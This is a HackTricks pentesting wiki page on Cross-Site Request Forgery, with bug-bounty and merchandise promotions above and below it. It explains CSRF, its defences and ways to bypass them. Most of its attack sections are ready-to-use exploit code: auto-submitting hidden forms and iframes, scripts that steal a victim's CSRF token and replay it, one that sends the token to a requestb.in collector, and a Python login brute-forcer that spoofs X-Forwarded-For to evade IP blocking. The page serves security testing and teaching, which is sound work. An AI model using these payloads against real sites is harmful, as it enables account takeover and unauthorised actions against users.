# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

## What is CSRF?

**Cross-site request forger**y (also known as CSRF) is a web security vulnerability that allows an attacker to **induce users to perform actions that they do not intend to perform**.\
This is done by **making a logged in user** in the victim platform access an attacker controlled website and from there **execute** malicious JS code, send forms or retrieve "images" to the **victims account**.

### Requisites

In order to be able to abuse a CSRF vulnerability you first need to **find a relevant action to abuse** (change password or email, make the victim follow you on a social network, give you more privileges...). The **session must rely only on cookies or HTTP Basic Authentication header**, any other header can't be used to handle the session. An finally, there **shouldn't be unpredictable parameters** on the request.

Several **counter-measures** could be in place to avoid this vulnerability.

### **Common defenses**

* [**SameSite cookies**](hacking-with-cookies/#samesite): If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites.
* [**Cross-origin resource sharing**](cors-bypass.md): Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the **CORS policy of the victim site**. _Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response._
* Ask for the **password** user to authorise the action.
* Resolve a **captcha**
* Read the **Referrer** or **Origin** headers. If a regex is used it could be bypassed form example with:
  * http://mal.net?orig=http://example.com (ends with the url)
  * http://example.com.mal.net (starts with the url)
* **Modify** the **name** of the **parameters** of the Post or Get request
* Use a **CSRF token** in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS.

### CSRF map

![](<../.gitbook/assets/image (112).png>)

## Defences Bypass

### From POST to GET

Maybe the form you want to abuse is prepared to send a **POST request with a CSRF token but**, you should **check** if a **GET** is also **valid** and if when you send a GET request the **CSRF token is still being validated**.

### Lack of token

Some applications correctly **validate the token when it is present but skip the validation if the token is omitted**.\
In this situation, the attacker can **remove the entire parameter** containing the token (not just its value) to bypass the validation and deliver a CSRF attack.

### CSRF token is not tied to the user session

Some applications do **not validate that the token belongs to the same session** as the user who is making the request. Instead, the application **maintains a global pool of tokens** that it has issued and accepts any token that appears in this pool.\
In this situation, the attacker can log in to the application using their own account, **obtain a valid token**, and then **feed that token to the victim** user in their CSRF attack.

### Method bypass

If the request is using a "**weird**" **method**, check if the **method** **override functionality** is working.\
For example, if it's **using a PUT** method you can try to **use a POST** method and **send**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

This could also works sending the **\_method parameter inside the a POST request** or using the **headers**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Custom header token bypass

If the request is adding a **custom header** with a **token** to the request as **CSRF protection method**, then:

* Test the request without the **Customized Token and also header.**
* Test the request with exact **same length but different token**.

### CSRF token is verified by a cookie

In a further variation on the preceding vulnerability, some applications **duplicate each token within a cookie and a request parameter**. Or the **set a csrf cookie** and the **checks in the backend if the csrf token sent is the one related with the cookie**.

When the subsequent request is validated, the application simply verifies that the **token** submitted in the **request parameter matches** the value stored by the **cookie**.\
In this situation, the attacker can again perform a CSRF **attack if the web site contains any vulnerability what would allow him to set his CSRF cookie to the victim like a CRLF**.

In this case you can set the cookie trying to load a fake image and then launch the CSRF attack like in this example:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

{% hint style="info" %}
Note that if the **csrf token is related with the session cookie this attack won't work** because you will need to set the victim your session, and therefore you will be attacking yourself.
{% endhint %}

### Content-Type change

According to [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), in order to **avoid preflight** requests using **POST** method these are the allowed Content-Type values:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

However, note that the **severs logic may vary** depending on the **Content-Type** used so you should try the values mentioned and others like **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Example (from [here](https://brycec.me/posts/corctf\_2021\_challenges)) of sending JSON data as text/plain:

```html
<html>
  <body>
    <form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
      <input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
    </form>
    <script>
        form.submit();
    </script>
  </body>
</html>
```

### application/json preflight request bypass

As you already know, you cannot sent a POST request with the Content-Type **`application/json`** via HTML form, and if you try to do so via **`XMLHttpRequest`** a **preflight** request is sent first.\
However, you could try to send the JSON data using the content types \*\*`text/plain` and `application/x-www-form-urlencoded` \*\* just to check if the backend is using the data independently of the Content-Type.\
You can send a form using `Content-Type: text/plain` setting **`enctype="text/plain"`**

If the server is only accepting the content type "application/json", you can **send the content type "text/plain; application/json"** without triggering a preflight request.

You could also try to **bypass** this restriction by using a **SWF flash file**. More more information [**read this post**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Referrer / Origin check bypass

**Avoid Referrer header**

Some applications validate the Referer header when it is present in requests but **skip the validation if the header is omitted**.

```markup
<meta name="referrer" content="never">
```

**Regexp bypasses**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

To set the domain name of the server in the URL that the Referrer is going to send inside the parameters you can do:

```html
<html>
  <!-- Referrer policy needed to send the qury parameter in the referrer -->
  <head><meta name="referrer" content="unsafe-url"></head>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      // You need to set this or the domain won't appear in the query of the referer header
      history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### **HEAD method bypass**

The first part of [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) is explained that [Oak's source code](https://github.com/oakserver/oak/blob/main/router.ts#L281), a router is set to **handle HEAD requests as GET requests** with no response body - a common workaround that isn't unique to Oak. Instead of a specific handler that deals with HEAD reqs, they're simply **given to the GET handler but the app just removes the response body**.

Therefore, if a GET request is being limited, you could just **send a HEAD request that will be processed as a GET request**.

## **Exploit Examples**

### **Exfiltrating CSRF Token**

If a **CSRF token** is being used as **defence** you could try to **exfiltrate it** abusing a [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) vulnerability or a [**Dangling Markup**](dangling-markup-html-scriptless-injection/) vulnerability.

### **GET using HTML tags**

```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```

Other HTML5 tags that can be used to automatically send a GET request are:

![](<../.gitbook/assets/image (530).png>)

### Form GET request

```markup
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="GET" action="https://victim.net/email/change-email">
      <input type="hidden" name="email" value="some@email.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Form POST request

```markup
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form method="POST" action="https://victim.net/email/change-email" id="csrfform">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
      <input type="submit" value="Submit request" />
      <img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
    </form>
    <script>
      document.forms[0].submit(); //Way 3 to autosubmit
    </script>
  </body>
</html>
```

### Form POST request through iframe

```markup
<!-- 
The request is sent through the iframe withuot reloading the page 
-->
<html>
  <body>
  <iframe style="display:none" name="csrfframe"></iframe> 
    <form method="POST" action="/change-email" id="csrfform" target="csrfframe">
      <input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### **Ajax POST request**

```markup
<script>
var xh;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xh=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xh=new ActiveXObject("Microsoft.XMLHTTP");
  }
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
  type: "POST",
  url: "https://google.com",
  data: "param=value&param2=value2"
})
</script>
```

### multipart/form-data POST request

```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
    method: "post",
    body: myFormData,
    credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    mode: "no-cors"
});
```

### multipart/form-data POST request v2

```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```

### Form POST request from within an iframe

```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```

### **Steal CSRF Token and send a POST request**

```javascript
function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open("GET", GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById("token");
            // Show the token
            //console.log("The token is: " + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```

### **Steal CSRF Token and send a Post request using an iframe, a form and Ajax**

```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
</script> 
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```

### **Steal CSRF Token and sen a POST request using an iframe and a form**

```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script> 
function read()
{
    var name = 'admin2';
    var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
    document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
    document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
    document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
    document.writeln('</form>');
    document.forms[0].submit.click();
}
</script>
```

### **Steal token and send it using 2 iframes**

```markup
<script>
var token;
function readframe1(){
  token = frame1.document.getElementById("profile").token.value;
  document.getElementById("bypass").token.value = token
  loadframe2();
}
function loadframe2(){
  var test = document.getElementbyId("frame2");
  test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2" 
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
  <input type="text" name="username" value="z">
  <input type="checkbox" name="status" checked="">        
  <input id="token" type="hidden" name="token" value="0000" />
  <button type="submit">Submit</button>
</form>
```

### **POSTSteal CSRF token with Ajax and send a post with a form**

```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="username" value="root"/>
  <input type="hidden" name="status" value="on"/>
  <input type="hidden" id="findtoken" name="token" value=""/>
  <input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
  x.withCredentials = true;
  x.open("GET","http://google.com?param=VALUE",true);
  x.send(null); 
}
x.onreadystatechange = function() {
  if (x.readyState == XMLHttpRequest.DONE) {
    var token = x.responseText.match(/name="token" value="(.+)"/)[1];
    document.getElementById("findtoken").value = token;
    document.getElementById("form").submit();
  }
}
</script>
```

### CSRF with Socket.IO

```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
    console.log('connected!');
    socket.emit('join', {
        room: username
    });
  socket.emit('my_room_event', {
      data: '!flag',
      room: username
  })

});
</script>
```

## CSRF Login Brute Force

The code can be used to Brut Force a login form using a CSRF token (It's also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):

```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
    #Return CSRF + Session (cookie)
    r = requests.get(URL)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
    csrf = csrf.group(1)
    session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
    return csrf, session_cookie

def login(user, password):
    print(f"{user}:{password}")
    csrf, cookie = init_session()
    cookies = {SESSION_COOKIE_NAME: cookie}
    data = {
        "tokenCSRF": csrf,
        "username": user,
        "password": password,
        "save": ""
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
    if "Username or password incorrect" in r.text:
        return False
    else:
        print(f"FOUND {user} : {password}")
        return True

with open(PASS_LIST, "r") as f:
    for line in f:
        login(USER, line.strip())
```

## Tools <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## References

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof is home to all crypto bug bounties.**

**Get rewarded without delays**\
HackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.

**Get experience in web3 pentesting**\
Blockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.

**Become the web3 hacker legend**\
Gain reputation points with each verified bug and conquer the top of the weekly leaderboard.

[**Sign up on HackenProof**](https://hackenproof.com/register) start earning from your hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
